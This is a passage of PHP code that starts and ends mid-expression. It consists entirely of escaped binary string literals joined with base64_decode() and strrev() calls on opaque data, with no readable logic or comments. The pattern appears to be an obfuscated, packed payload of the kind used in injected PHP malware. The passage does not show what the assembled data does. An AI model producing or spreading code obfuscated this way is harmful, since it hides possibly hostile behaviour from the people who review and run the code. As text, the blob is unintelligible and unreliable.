cf\x18\xbd\x7a\xd7\x8e\xcc\xc6\x91\xf7\x9d\xdc\x6a\xfc\xed\xb2\xc7\x36\x38\x36"."\36\375\370\262\135\237\37\331\77\163\335\226\255\217\266\345\246\17\35\272\346\215\316\153\116\33\172\313\143\275\307\367\255\330\123\63\357\12\177\237\362\326\257\277\255\171\343".base64_decode('+5j3p4WnX3Xe8BL3aUeWXFP2ZFXX97pv3VWj5n04/dPnHceuu3zNFUtOvS5UG10=').strrev('GØÿ½ûäz}),Wñ¢×Y÷˜~¯åwW^¥^soö>ÏÓÊùã1ÜÎŒİyò')."\337\334\132\235\352\171\373\311\37\216\36\177\135\321\77\216\137\63\373\307\205\143\332\176\133\133\325\163\352\101\7\175\271\340\224\236\175\172\117\356\112\75\261\372\352\305\143"."\x66\xdc\xff\x43\x59\xe5\x57\x5b\x16\x84\xcc\xeb\x2f\x90\x9e\xd8\xfd\xd1\xb8\xaf\x4e\x59\xab\xdc\xe0\x4f\x7e\x13\xdb\x9c\xaa\xab\x7d\xb7\xf1\xcd\x6d\x47\xc\xbc\xbf\x64\xae\xfb\x84\xe5\x7"."\177\76\242\367\334\303\136\174\354\374\25\237\14\376\163\113\357\147\336\240\366\323\350\361\233\37\57\73\326\234\370\364\353\303\206\114\370\153\311\306\273\146\50\337\255\30\367"."\363\57\57\177\376\350\314\320\13\127\137\177\352\365\132\152\313\260\332\312\207\217\277\357\216\125\233\122\167\336\236\136\276\263\377\351\271\37\234\265\371\337\37\316\16\56\370"."\xe5\x9b\x8f\xaf\xdd\xf1\x5b\xff\xcf\xbf\xfc\xba\x7c\xca\x5f\xf6\xec\xbc\xeb\xe6\xf9\x93\xcf\xfe\xed\x87\xc1\xef\x36\xbc\x7c\xf3\x6f\x1f\xfd\x72\xfe\x8e\x5\x3\xbf\x5d\xbb\xfc\xae\x1d\xae"."\x3f\xed\x59\xfe\xf0\xe2\x85\x5f\x4c\xfb\x65\x4d\xcf\xd9\xf7\xbe\x32\x6f\x8a\x6f\xd4\xbc\xa6\x85\x97\xbd\xb2\x5f\xf1\xf7\x47\x76\x57\x36\x2e\xf9\xdb\x55\x3d\x5d\x7f\xfd\x25\xfe\xc6\xca\xf7".base64_decode('D9j8zhEv3T3riTWVZW1PXnd6y/M3HHf8U7Hjpv50VKlUdN0D1w1P3nvPa9mHZ20=')."\270\252\363\205\207\33\376\236\272\143\307\155\233\36\33\62\345\357\323\357\175\360\31\367\250\362\273\56\70\53\71\376\325\356\277\166\34\263\151\304\366\320\236\251\317\367\37"."\xf0\xc5\x3\xaf\xd6\xaf\x7f\xe9\xf6\x33\x2f\xbf\x56\x39\x3a\xb8\xac\xf2\x8d\x5\xb1\xc6\x2d\x3d\x87\x1b\xbf\x95\xfc\xf8\xc6\x33\xbb\x3f\x7a\x69\x9c\x76\x77\xee\x93\x13\x5f\xa\xcd\xed\xdb"."\262\261\357\273\177\55\110\276\166\367\365\317\74\257\376\340\172\357\233\327\113\247\337\175\303\11\317\334\364\365\226\203\357\373\371\173\375\366\115\47\310\175\337\15\75\72\167"."\xe1\xec\xbb\x9e\x3b\x72\xc9\xf9\x1b\x1f\x3c\xe4\x7f\xae\xfc\xe4\xf8\xa3\x63\xff\x7d\x69\xce\x95\xb\x47\xb9\xcb\x5e\x1a\x76\xee\x96\x3b\xe6\xec\xbf\xe2\xeb\xb7\x4b\x6e\xff\xec\xcd\xc9\x65"."\303\127\15\375\142\373\140\375\266\344\316\306\5\361\107\16\367\234\276\375\341\363\146\236\123\362\365\21\377\331\70\63\62\362\201\345\127\274\170\163\242\151\301\163\333\257\160"."\154\253\164\225\177\167\357\15\275\23\56\72\344\243\127\276\273\250\327\273\366\344\342\265\273\377\61\376\315\127\346\224\134\363\343\123\347\236\34\271\51\363\200\143\334\215\141".base64_decode('518+H37tvMxfxxzZVnr/2XuWrjm/vN/YWvX8a5vLWuevP+HfLdtXnXHz35SN5Z8=')."\x2d\x79\xbb\xf6\xae\x1f\x4f\xfd\x72\xe9\x69\xe9\xd\x37\x3d\xb9\xfd\xc1\x45\xb7\x67\xff\x36\xd4\x31\xe3\x9f\xbf\x6e\x7d\xb0\xe3\xad\x57\x76\x3f\xdc\xb5\xe1\xbd\xa1\xe6\xa1\xf\xc5\xcf\x38"."\xfe\xbc\x45\x3f\x2e\x9f\x90\xdc\x36\xe7\xe5\xa5\x13\xbf\xdc\xf8\xd9\xc3\x13\x9d\xa7\x7e\xbc\x7b\xde\x81\x3d\xda\x9f\x1f\x18\x3d\xe6\xfc\xf\xf6\x39\xa7\xeb\x6e\xe7\x55\xab\x67\xba\x8f\xeb".strrev('›?Gµ½Æi¼^C¼Èà>¿àæ>ØóÎÊ©öÌñÙ­wÄçgîşÜgÖİmÖÌ').strrev('ç¯oƒu÷=w=ªw¥è¤³ìv}şæiz|¶÷ŸFGgßşÜw>Îş[¾xØ')."\272\127\333\166\340\340\321\133\116\312\335\60\263\163\361\213\17\225\145\16\254\50\236\274\377\202\7\367\375\223\277\165\221\327\37\276\163\315\201\127\136\374\257\63\253\147\134".base64_decode('pzxcNuLvm8667l9vHjlnfvHK6t8SS29c8Nxt278Z/d341TtnvHDkP6cuOHOw7rA=').base64_decode('lNP55yHLnlPvD7nHnvmfi75fU+3/ftPMldWt47/4+derTmq9Y1vn9h0ztfNjtx0=')."\135\331\361\343\222\360\306\333\36\373\374\351\300\77\156\334\364\355\366\227\137\77\252\270\267\364\205\304\320\305\7\257\271\355\374\347\247\135\376\356\137\253\116\150\176\337\265"."\244\65\261\141\140\373\216\321\57\156\232\75\171\344\247\17\64\135\324\271\360\62\351\373\45\145\207\354\323\364\124\355\141\47\5\56\330\174\305\327\256\313\53\103\245\317\135".base64_decode('MfjAzNfLnIu3H3HJEwt6vll4V7bq4M+OevLry4aeoQVPP27LoWVzX/9o69ZnPng=').base64_decode('Z8FrF7/9r57dN1XPX3XvLdcddfczi3uebb1p35/iwZKre756pPr7t1966dlLb40=')."\65\176\275\241\143\330\347\331\327\373\56\372\264\343\210\75\333\264\355\107\47\126\215\172\375\311\165\227\14\77\170\135\325\155\303\76\74\170\317\227\207\155\374\371\253\141\173".base64_decode('1h1Xeb9r2c/NjicHruq65NzxB26O7/NWT/MVGw87+G/3HnHLnsiuRc0XH3n3txc=')."\154\272\147\344\334\41\213\206\135\126\122\51\55\223\206\216\13\254\272\150\124\345\75\252\74\157\226\343\371\245\247\376\117\305\53\107\265\16\374\347\307\23\203\333\372\277\371"."\247\333\365\227\137\6\177\136\372\336\15\173\76\36\367\361\31\213\7\276\171\345\312\23\317\376\351\343\236\233\27\353\277\355\332\276\66\365\350\300\236\127\227\237\275\370\324".base64_decode('Xxf/967lyaB78s/v//KPv0zc89OTy7Xfun/+asee/35/4pbLzvvP84e8tvbawSs=')."\173\346\34\122\235\370\240\375\352\23\127\175\367\314\227\247\156\70\167\315\334\350\365\352\212\5\213\246\135\264\160\273\271\363\315\314\43\157\337\170\343\316\177\275\273\363\335"."\337\74\173\262\345\103\127\134\272\362\253\235\147\177\175\264\372\350\271\57\75\377\132\365\252\267\126\316\330\62\341\373\363\277\66\67\266\336\170\374\262\351\27\267\374\174\357"."\360\27\166\376\66\254\375\210\57\216\124\367\231\276\357\363\43\227\77\373\255\361\310\57\7\34\375\335\265\353\313\77\70\165\352\352\104\150\124\211\172\365\175\372\326\43\257"."\x7d\xf9\xa4\xcf\xdf\xbf\xf0\xc3\x67\x47\x26\xee\x5c\xfd\xe2\xb3\x2d\xd3\x2e\x3c\xf0\xe8\xd7\xaf\x7c\x6f\xf3\xee\xa2\x5f\xd5\x6b\xde\xef\x88\xde\x35\x6a\xc8\x8d\xaf\xf6\x7f\x78\xf8\x2f\x47".base64_decode('Bf57dlnDyfQOSQWxfSI/EyYQw7XxY4kwnNB7jF6lAwdGk1RVY6ny25/J6eSkrmo=')."\x2\xd9\x34\x1f\x43\x54\xb3\xb4\xd2\xd1\xa7\x12\x5\x9c\x44\x8d\x1d\x43\x8a\xe8\x88\x77\xf6\x24\x52\x24\xe7\xd8\xa\x92\x45\xd3\x8d\x8e\x5e\xba\x33\x30\x7a\x2c\x4d\x6b\x76\xcb\x4a\x8a\x9c"."\xda\xaa\x69\x4d\x8e\x27\x89\xad\x61\xd5\x58\x72\x1e\x9e\x4e\x75\xc4\xba\x15\xa2\xc2\x56\x95\x13\x43\xaa\xb1\x63\x49\xb9\x89\xde\xce\x98\x4a\x33\xf5\x99\x71\xbd\x83\x9a\xeb\x74\x74\xf7\xb4"."\xf5\x29\x56\xdb\xf5\x71\x13\x48\xb6\x7e\x45\xee\x4c\x77\x91\x46\x26\x8c\x2e\xa5\xad\x97\x6c\x6\x57\x55\x11\xf4\x4c\xa8\x20\x1f\x5a\xa6\x37\x96\xee\xa1\x96\xe9\x99\xb6\x6e\x3d\x41\x4a\xad"."\244\175\156\313\45\272\65\223\24\247\167\366\366\164\323\343\343\234\332\227\116\164\221\262\315\336\144\227\101\155\255\53\306\221\266\50\251\316\166\75\103\306\141\54\155\341\350"."\x4a\x52\xfd\xf8\xca\x9\xa4\x92\x76\x39\x93\xee\x27\xe6\x7\x13\xc6\x12\x68\x7f\xbb\xda\xad\x53\x3b\x99\xb8\x91\x8d\xf5\xf4\x92\x24\xa3\xc7\x90\x12\x80\x5a\x69\x64\x55\x62\x45\x90\x49\xf6"."\365\147\333\11\302\162\375\355\235\335\161\202\260\61\343\110\373\273\322\162\147\73\121\2\307\322\146\364\306\324\216\376\70\51\144\102\45\101\150\274\133\156\353\352\355\47\5"."\x54\x12\xe2\x19\x4d\xe9\x25\x17\x6b\xd3\xe2\x29\x62\x53\x31\xba\x8a\x60\xab\x7\xb4\xa6\x4d\x23\xad\x1c\x4b\x6a\xad\x1a\x4d\xf2\x74\xc7\xfb\x12\xb9\x2e\xa2\xc5\xf7\x24\x8c\x9c\xdc\x46\xd0"."\255\166\352\335\51\203\344\313\166\252\351\216\70\11\214\253\42\324\322\225\220\333\322\164\203\53\333\257\150\152\207\116\321\115\350\277\202\222\170\137\147\322\324\351\335\217\361".base64_decode('VWMoFshHTzop59oJkaf6zbhG58q4CaSEcWNIteMrKimW2jtNOY4DckxJZXOkgso=').base64_decode('CtLRVFrLKXGis46mRDahspI2j5SZ683oSYPMjWRfb06LEzz369lUjtJrh9qjtXc=').base64_decode('ksDo0QTFFePpjKX4VXrMjja6K141nkDjPZ1JUBhJS0hqXAUZ3aoJ4+iY9CYT/YQ=')."\150\332\222\335\231\36\152\237\320\333\227\350\222\65\122\100\122\351\65\62\175\44\331\370\61\244\224\116\63\336\143\120\103\241\252\361\234\50\273\73\332\110\173\52\306\222\301"."\31\103\251\40\227\64\173\372\273\111\121\343\306\121\162\113\230\35\6\45\267\261\345\244\275\61\331\214\167\265\223\242\262\231\134\117\302\44\347\33\25\264\3\355\151\63\236"."\124\110\63\53\52\111\155\23\46\20\134\217\36\113\52\310\251\261\236\144\67\65\2\322\143\152\52\115\46\176\256\53\15\46\65\241\377\252\161\44\143\305\150\102\55\343\50"."\x67\x1a\x53\x4e\x86\x60\x6e\x9a\x8c\x71\xad\x1c\xef\xa4\xfb\xde\x86\x29\x9b\x94\x22\x58\x2\x76\xe9\x28\xe3\x4a\xcb\x19\x66\x20\xd4\x48\xc6\x3e\x2e\x5a\xa3\x8b\x9\x3a\x15\x85\x5a\x48\x53"."\313\153\156\201\142\344\320\135\16\2\127\323\12\337\300\117\304\370\126\11\334\171\22\354\126\140\60\54\346\214\147\114\41\32\204\54\261\141\123\323\231\245\14\266\301\163\301".base64_decode('Vrms/aS4KXBISzbEDaNH0wk6OrVEPKXlEpZSEzFLmQxKd4jsMW17gYNy+Hm6ALM=')."\40\50\206\106\214\131\120\301\77\244\271\370\332\234\241\164\345\24\166\255\3\247\166\321\61\210\11\303\215\217\32\114\331\350\164\211\140\247\30\253\146\100\63\123\51\227\365"."\72\45\274\133\107\251\43\312\315\313\141\73\133\4\373\50\30\26\166\205\205\16\361\101\23\60\50\216\235\265\363\364\360\354\223\15\217\15\136\172\315\356\253\357\337\275\142".base64_decode('/eCjV36y/v7BrVeD4K5NKwfX3/TpqiW7Nq3YtemcT5Y+9NWWSwYv3fDJ+VsHb1g=').base64_decode('O3jH0l2Pbf3kL0s/Xrt816b7dt9w8eCSR3Y9ds3gRbcMLr1095Urdm29AaTffRE=').base64_decode('LxkkG7zvOph3y3mDmzZ9cutaFvvVlnNxY/oJ45+mmPDGIrU7QwQpTZYIKSqGS2o=')."\116\51\0\165\122\274\135\211\167\102\43\65\263\135\321\45\23\31\253\311\340\157\106\313\70\61\251\341\73\241\206\244\146\140\264\104\221\356\242\63\103\60\40\316\46\64\6"."\115\30\226\133\260\144\212\247\373\140\120\370\146\104\35\121\322\131\110\232\4\327\156\174\261\214\133\303\133\351\267\320\140\341\210\2\144\11\107\214\23\104\11\374\44\7\231"."\160\243\126\152\223\1\40\121\55\265\201\154\22\275\77\42\231\32\375\46\344\346\206\75\167\243\106\13\244\46\306\341\236\362\110\333\224\53\110\112\254\321\224\234\222\354\54"."\205\157\354\223\156\10\167\46\360\151\31\7\210\163\330\312\200\54\263\333\312\272\304\50\53\336\310\316\73\262\345\160\110\270\51\16\11\35\335\113\326\53\225\320\66\203\332"."\73\210\23\126\154\276\256\144\123\162\234\65\75\333\127\20\345\142\153\104\273\1\133\327\302\5\320\310\72\147\211\4\43\223\63\13\44\24\261\155\71\107\327\352\122\200\255"."\362\323\143\144\135\301\273\201\203\374\204\1\124\304\270\262\256\44\124\122\125\132\111\243\224\364\222\4\72\327\140\226\344\161\60\355\164\313\361\344\244\51\331\366\54\274\263"."\156\116\234\102\56\316\222\143\327\250\120\57\371\346\127\174\104\150\312\176\344\311\46\151\175\255\160\271\34\46\43\214\264\332\351\164\12\247\4\51\166\70\10\277\110\251\374"."\xc8\x1e\xc0\xbc\x90\x91\xec\xd\x5e\xcf\x4c\x5e\x0\x87\x49\x26\x15\xc3\xac\x46\x57\xdb\xa4\x51\x12\x68\xef\x38\xd7\x18\xf0\x81\x26\xce\x58\xd7\x38\xf0\x89\x90\x45\xf8\x47\x2b\xbd\xae\x92"."\63\350\115\225\134\46\105\233\11\76\101\35\241\134\6\216\131\65\157\272\222\111\10\31\46\312\161\263\106\150\176\33\101\221\213\167\113\36\305\343\225\304\60\202\146\241\263"."\75\44\1\315\333\144\35\105\320\15\47\33\130\60\130\100\274\110\30\310\234\227\160\0\122\244\41\334\337\215\312\155\344\366\240\57\143\207\360\11\24\115\52\146\224\10\54"."\x84\x82\x6a\x3d\x61\x5f\x5d\xb4\xd9\x43\xaf\x9a\xc8\xd9\xac\xdb\x48\x74\x1a\x6e\x68\x17\xaa\x76\x2b\x7e\x35\xe6\x86\x57\x73\xe1\x28\xbb\x62\xd4\x26\x7\x71\xf2\xa8\x1c\xd3\x74\x93\xb6\x3a".base64_decode('B28MdYp14+8Qp1bYMTQev9MpUyStLGhrhlkYGymZqqgG6ICaURid5wzxyoXC2QY=').strrev('ÍÇ?¼'."\n".'ëUl/³OO¢?œÙ?!}ëFÕ÷êI*D†`Ü.…yÍ´')."\140\210\337\243\203\347\171\242\361\240\50\120\301\73\367\360\166\103\130\42\246\265\140\36\325\65\172\102\354\6\303\130\127\271\253\202\247\5\25\106\341\105\216\32\172\211\67".base64_decode('HPGECvhfwH4ZyCAQXwwkQ2NwtlQX9Lc0BcLY4QCGB4JCPLJTJ9HUO0N+NCne2+w=')."\xf7\xd4\x79\x25\x5f\x20\x12\xa4\x17\x51\x98\xe5\x30\xba\x82\x14\x66\x61\x8a\x2\xdd\x50\x98\xdf\x5\x92\x1f\x7\xc4\x6b\x52\x62\x89\xac\x24\x32\xa1\xe6\x39\x8a\x5b\x8b\x5a\xcb\x5a\x4b\x5a"."\x4b\x17\xba\x5a\x8d\xf9\x6e\x71\x48\xc8\xb2\xdf\x5c\x4f\xba\x54\xcd\xbe\x98\xac\xd0\x14\xe\xcf\x24\xb7\xeb\x82\x21\x4f\x9d\x9f\x56\xf\x66\x4\xf9\xc\xd6\xf9\xf0\xc7\xc7\x57\x6d\xdc\xf5"."\xe8\xca\x8f\xaf\x5f\x3f\x78\xf1\xa\x50\xd0\xee\xd5\xe7\xed\xbe\xf6\x11\x20\x6a\x41\xf1\x6a\xfd\x25\x1f\x6f\x5b\xb9\xfb\xaa\xd\xbb\x2f\x21\x62\x91\xf4\xc9\x86\x3f\xef\xda\xfa\x97\x8f\xaf"."\x5a\x3b\xb8\xfe\xba\xdd\xd7\x6c\xfe\x78\xf5\x5\x38\xe2\xd3\x75\x1b\x7\x97\xad\x65\xd\x93\x3e\xbd\x72\xdb\xee\x95\x6b\x98\xc8\x85\x25\x2d\x7\xc8\xfd\xe9\x92\x15\x1f\x6f\x5d\xf\x5\xae"."\xdb\xcf\xd9\xfd\xf0\xf2\xdd\x37\xac\x18\x5c\x76\xeb\xe0\xaa\xb5\x1f\xaf\xdc\x30\x78\xdb\xf9\x83\x17\xae\xf8\x64\xc3\xd5\xc3\xec\xc4\x83\xc3\xf3\x28\xfa\x89\x49\x8b\x7b\x41\xab\x51\x56\x82"."\x51\xda\x6a\x8c\x82\xe8\x2c\x5\xbf\x25\xf0\x2e\xb\xf8\xa5\x26\xf9\xc8\x6a\x7b\x66\x8b\x37\x50\xe7\xb5\xdf\xd\x13\x83\xc4\x51\x45\x19\xa6\xa\x6c\xa4\x44\x84\x6d\x83\x38\xba\xa0\xe1\x28"."\272\16\130\274\327\126\14\220\61\27\32\45\64\246\336\33\256\13\371\152\275\344\266\4\33\250\21\110\76\44\226\61\0\32\16\315\142\337\354\202\144\236\173\21\251\204\22"."\160\251\144\351\210\354\212\153\251\134\72\203\32\53\25\101\143\273\42\7\344\164\110\316\224\212\340\172\14\0\112\34\114\267\22\350\156\0\131\143\27\317\55\166\224\73\52".strrev('òæÅƒHJ;$†”â­xâí",í”T©yG'."\n".'¡,Äq*YòÏ´b"¤F¾ ç{â%J')."\264\200\107\31\246\56\253\200\151\111\161\7\3\261\374\340\327\342\77\44\356\342\71\360\70\201\24\166\230\344\11\324\133\123\142\267\43\315\305\310\100\66\356\302\370\25\207"."\271\270\124\212\221\73\50\5\42\121\66\13\62\152\54\310\50\31\105\170\103\363\64\66\336\370\202\211\204\357\37\342\146\311\6\35\50\2\105\103\5\241\170\264\150\132\15"."\164\3\14\16\116\17\76\130\14\274\212\301\112\2\54\210\105\320\21\204\160\66\210\5\342\220\77\230\42\54\117\342\176\246\215\44\145\157\304\17\111\323\134\326\7\112\313"."\x64\x8\x14\xee\x4d\x6\xde\xa4\xf4\x46\xea\x1a\x31\x95\x87\x5\x32\x4f\xc4\x46\x58\x8\x95\xa3\x53\xb2\x90\x8\x53\x61\x48\x3a\x3c\x5d\x20\x43\x38\x4\xa5\xf3\x5\x1a\x82\xa1\x26\x7c\x83"."\60\134\327\350\155\362\270\10\343\306\224\200\323\103\251\115\252\221\212\41\347\303\240\142\13\372\121\105\24\145\21\124\53\230\127\121\23\310\136\30\13\331\44\151\14\31\175".strrev('£"ê4ÂDÚ¦ë„^dÁV-×Ïa'."\0".'@(‘CœÉ¦ìbš–Q—+İ	')."\76\222\100\341\260\314\272\140\240\301\107\57\113\326\307\54\161\365\41\37\164\15\100\252\225\150\11\121\156\161\3\2\331\236\4\373\346\327\342\141\4\133\321\101\200\57\350".base64_decode('MEZw1QSrCQfYNxeKQQBafHLeOruefTeye8wwIhgSAp6QpynMgqHZ7IYNg+GbNtE=').strrev('û÷¡¤”¸µT‡'."\n".'¢şkƒx!¥LÿøŠÛâ¶”¦Ê¸”¸©ªMŠA'."\n".'@,Ï~ççK@')."\242\146\73\220\362\242\274\226\231\376\250\77\70\15\207\221\13\51\157\46\301\365\26\151\236\4\4\352\10\27\250\15\272\60\61\132\227\0\205\112\370\12\264\24\10\316\366"."\x70\x7f\x44\x42\x4\x86\x10\xb9\x5b\xe2\x5e\x8a\xdc\xb\xe6\xb5\xf6\xb4\xba\x80\x14\x60\x2c\xe4\x97\x10\xeb\x6b\x25\x2a\x5f\xd4\xa1\x2d\x7\xbc\x33\x41\x72\x7b\xe8\x5a\xb9\xd0\x41\x96\x85".strrev('ŠMàêÒT¡?7ÂéÕ²:Ğ:Ú2'."\r".'|Dmè¦Î\'@’!ˆ¡Îÿ'."\0".'™'."\r".'ë€"?RKJh')."\172\347\200\205\64\34\266\134\133\215\42\17\73\244\164\320\131\362\205\247\46\16\114\42\77\104\131\233\104\120\100\202\223\153\330\230\172\147\16\4\300\337\151\221\1\57\370".strrev('8½{fFõ«Øà2.ÿ'."\0".'ÁšËß|H†Rˆğÿ€á›ïÎó'."\0".'%•5ş?ë')."\375\46\277\74\51\340\52\244\253\202\247\61\170\103\203\104\363\33\33\244\350\150\264\4\41\323\71\177\124\151\64\352\66\132\10\331\60\127\21\45\305\303\53\212\311\102\341"."\x9\xd7\xd\x30\x16\x6b\x21\x88\x7c\x5a\x40\xf7\x29\xac\x84\xc0\x3c\x67\x91\xf0\xb4\x50\xb0\xa5\x59\x8\x37\x7a\x66\xf9\x2\xd3\x68\xc8\x5d\x46\xbf\xca\xa8\x7\x9f\x7a\x5f\x18\xa0\xa8\x8e"."\22\43\167\350\45\206\361\67\226\175\104\161\326\102\331\365\200\175\203\200\40\213\103\51\37\263\137\353\144\253\155\361\371\353\305\233\372\60\41\376\32\201\130\67\131\70\106"."\320\306\321\60\272\263\117\3\20\345\364\33\221\33\15\40\34\320\0\106\0\15\41\164\321\0\162\34\106\3\250\243\64\0\325\16\157\200\306\1\145\17\50\152\124\203\153"."\227\273\331\125\323\211\211\230\340\61\2\262\137\27\336\206\203\336\104\200\2\46\263\35\134\333\106\54\332\306\22\266\10\260\141\246\44\334\170\207\73\272\302\326\223\33\247".base64_decode('ABImSgN+WxdOQRLwQkqn+Ja1GVHNlKVSchsTVOpDV2CFaskaznek8A5mVBP2z/E=').base64_decode('jjrZXOZ7PVZViLGhhUzDIZ4pHORX592yWvBCCBn8I/BPK0lLtzrInaViB1lVfcE=')."\250\37\254\25\121\121\121\364\5\311\376\210\53\46\272\66\210\162\17\11\56\231\133\255\232\172\116\360\72\206\54\130\301\60\172\370\105\150\266\145\203\342\162\61\230\130\300"."\233\252\125\303\155\71\10\305\323\221\110\114\20\110\35\42\140\157\154\166\363\122\21\314\55\124\331\76\42\65\214\125\1\312\55\31\304\35\171\71\41\230\243\112\264\146\264".strrev('Y±È¤¬3r®)kêÑ‹noÎÙ§éõZ'."\n".'¡Ø0Åiı¼*‰Ê@çBŠ‘$º±™Á')."\x7d\xc\xd9\xf6\xf2\x3b\x34\xc\x71\x86\x60\xf3\x8b\xf6\xc\x39\xbe\xb1\xd3\x3a\x5b\x46\x52\x92\x8f\x75\x5c\x48\xc5\x81\x7e\xee\x3\xd\x6e\xd7\xf1\x32\xe7\x53\xc9\x94\x77\xb2\x5f\xcd\xda"."\x37\xe6\x32\x5a\xb3\xa2\xa7\x55\xb4\xf\x39\x9b\x5f\x28\x60\xf1\x42\x6e\x74\x43\x83\xde\x7f\x29\x88\xdc\x5c\x6\xd4\xd0\xcc\x46\xd6\x49\xf\x10\x99\xe7\x4b\x44\x30\x12\x93\xcf\x98\x95\x3c".base64_decode('GFKUVzCjRlyDFKuTU4hhtsaZmtYkZ/oi2iyVHhLWB2cH/EHq2on6fcOhJDnDBDo=')."\x8e\xee\xa2\x1\x93\x7e\xe8\x32\xa9\x79\x36\x5d\xc7\xe0\xde\x91\xe0\xd\x74\x98\x48\x3\x68\x30\x39\x4d\x7a\x42\x75\x8d\x40\x2\x8d\x36\xf8\x80\xe0\xed\x9d\x13\xe1\x5\x34\x82\xac\x40\xa6"."\x15\x86\x49\x80\x36\x51\x7f\x27\x80\xa1\x42\x26\xe6\xd7\x92\x6c\xf2\x2\x26\x45\xfc\xfc\x58\x26\xb0\x2f\x48\xf2\xba\x14\x78\x21\x2\x1b\xa5\xc3\x4b\x2b\x2c\x23\xf6\x68\xf3\xc7\x99\x5a\x4"."\227\171\173\231\233\5\363\325\221\204\254\102\35\151\21\177\134\141\110\341\262\65\310\206\356\237\374\141\46\356\274\21\325\204\62\11\174\313\226\7\21\20\266\236\47\143\335"."\116\242\271\203\22\300\54\201\322\320\10\26\322\140\150\56\351\276\21\261\360\77\232\213\314\126\123\66\325\270\33\335\303\43\102\302\104\264\125\212\367\277\211\340\261\10\260".base64_decode('QPZFzy6J+xx+AuDBP3PTCSdoONmjTigmc1sCZ5lHcKoi3GJMMwbVI3gWk7sVeN0=')."\x84\x4a\xe2\x79\xa7\xbd\xa4\x2b\xf9\x9d\x63\x7e\x6a\xac\xa7\x64\x33\x82\xf5\xd1\x70\xb0\x25\x44\x37\xee\x60\x18\x5d\x68\xb\x79\xeb\xe6\xb2\xfd\x34\x6\x6d\xf0\xcc\xb2\x43\xe0\x1c\x88\x78"."\xa6\x15\x4\x33\xa5\x9\xc2\x91\x58\x12\xd\x5\xa1\xee\xe8\xf5\x37\xd8\x32\x84\x1b\x99\x93\x37\x2b\x2c\xea\xf7\x5\x66\x14\x8c\x88\x4\xa3\x4d\x42\x16\xc\xf4\x45\xbc\x4d\x76\x98\xb5\x84".strrev('’ÒâëJwáŒêô $’ j‘d„]n–@Š'."\n".'±²@0_h„ëõ®_Î°')."\x56\xf7\x14\x57\x19\xd3\xbd\x30\x3f\x11\xae\xbe\xed\x5\x6c\x50\xbe\x5f\x6d\x7\xc0\x25\x83\x2\x71\x36\x12\x72\xbb\x5c\xa4\x12\xf6\x1\xb4\x43\xe6\x2b\x87\xb2\x51\xe2\x59\x33\x8c\xbd\x8a"."\130\132\141\273\245\117\57\310\272\354\216\350\174\170\373\74\32\236\33\146\330\306\244\130\50\336\102\137\70\231\170\212\146\113\14\376\66\213\111\341\61\157\301\204\26\2\265".base64_decode('XCAUQS5V43OBT9qEFs9BxyUc43yZASCXpQjArju54EfmXJjOzQxYdsiKWFfvbZg=')."\326\350\233\76\303\337\24\10\66\317\14\205\43\55\263\146\317\231\173\26\301\56\45\201\66\311\111\245\132\342\342\316\335\55\353\356\156\352\106\25\113\234\356\131\160\133\115".base64_decode('Mdz8ehkDidIQA4LeA0ZI2Zh7Xqsxnw6+O6F0k09u/2DwrQ+ycDpFv6qQTkQJKBE=').base64_decode('s62CBMBPjIS1kgMrqWXKXGfamWiNTIPu4VrPYkhXdcE/W1zLJFTharEcp8JOLt4=')."\xc9\x6e\xee\x42\x36\x6c\x38\x7b\x54\x3a\xac\xc3\x99\x2b\x17\x72\x64\x1e\x95\x91\xd7\xa2\xa8\x68\x9c\xd2\xe5\x34\xd4\x64\xc6\x29\xa7\x92\x1a\x10\x7c\xda\xd3\x14\x2a\x77\x5a\xe2\xb9\xaf\xc0"."\254\226\122\251\313\246\56\47\250\102\210\303\211\101\341\164\61\203\107\124\314\317\42\14\30\54\44\322\72\142\367\354\144\27\56\52\215\266\251\305\200\314\13\144\30\165\242"."\132\32\103\134\233\66\0\11\124\270\331\105\235\125\362\113\346\120\206\101\336\74\161\320\41\161\107\311\124\221\56\54\140\101\375\115\270\252\106\31\141\272\223\37\4\246\73"."\xd9\xc1\x5b\xdc\x22\x18\xc0\x35\x98\x87\x74\x61\xed\x27\x5e\x89\x41\x5c\x6d\x1f\x3d\xa2\x27\x17\xcb\x6a\xfb\xe0\xe2\x9d\x27\x85\xc2\x1b\xdf\xa2\x63\x67\xcf\xec\xf0\x18\x67\x63\x93\xa7\xce"."\x9\xd8\x79\x25\xb5\xad\x5\x8b\x6a\x6b\x4\xac\xaa\x94\x96\xe4\x1e\x63\xc\x95\xf5\x31\x64\x54\x95\xd4\xe\x90\x4f\x88\x24\xdf\x8d\xe2\x70\xab\xfb\x50\xc\xc4\x5e\x0\x81\xb6\x99\x80\xc7"."\223\124\212\303\120\33\361\140\40\237\211\70\214\275\113\21\252\3\223\201\65\30\166\203\360\211\2\365\316\51\130\357\234\102\365\316\261\325\73\47\277\136\14\262\21\251\234"."\xcd\xd6\x61\x77\xc5\x3\x2\x27\xb3\x80\xe2\x62\x80\xae\x22\x6d\xf0\xf8\x55\x3c\xc4\x25\x7a\x35\xb6\x4c\x73\x81\xe8\x7a\x2c\xd0\x26\x58\x7a\x83\x7f\xb1\x89\xd0\x26\x4c\x11\x4b\x71\x2e\x6a"."\x1a\x34\x40\x16\x2d\x83\xf2\xad\x94\x6c\x98\xb3\x2c\x4e\x48\xfe\xd0\xd9\x27\xbc\x29\xdf\xc4\x54\x10\x26\x37\xba\x35\xc3\x70\x43\xc7\x66\x48\x5a\x66\x46\x11\xc1\x30\xdd\x48\xb4\xf6\x9\x9f"."\30\13\32\57\161\265\304\374\116\62\257\224\334\165\45\336\377\301\337\136\346\74\2\10\375\236\44\164\0\0\130\33\301\212\267\67\253\31\212\350\105\65\241\40\107\173\354".strrev('\'37¦'."\0".'¹T(¡§YÍºè\'^ãó‹iœÂ Î^ŠrıJ>wĞcæB÷-4rà­¦')."\234\366\356\100\126\300\371\240\316\134\266\342\363\1\147\101\200\123\270\273\216\271\201\340\302\27\264\213\24\15\233\111\346\157\73\302\15\351\163\34\377\234\125\250\327\116\235".base64_decode('+0kFY4mda89Q+qjHUdsMsDkpbZ3W2tQaEdFk6nJbG2i24PfQ0pbfc6NKdsFGFnQ=')."\234\112\42\221\124\357\326\221\161\203\243\47\312\250\23\371\325\57\100\237\63\41\234\120\150\33\267\210\310\346\204\7\36\104\232\200\253\63\105\33\122\332\261\367\132\312\26".base64_decode('kFdZ4oWauXkF6MnUagmy1C0qAtRWVF00vAT8lhY5iqDwh8JwpCAAtaOoengJ+ig=')."\45\356\32\372\211\301\257\340\306\221\237\272\20\165\175\212\154\232\302\176\341\24\204\15\70\277\53\335\225\356\36\62\347\247\164\301\32\271\33\171\73\237\357\2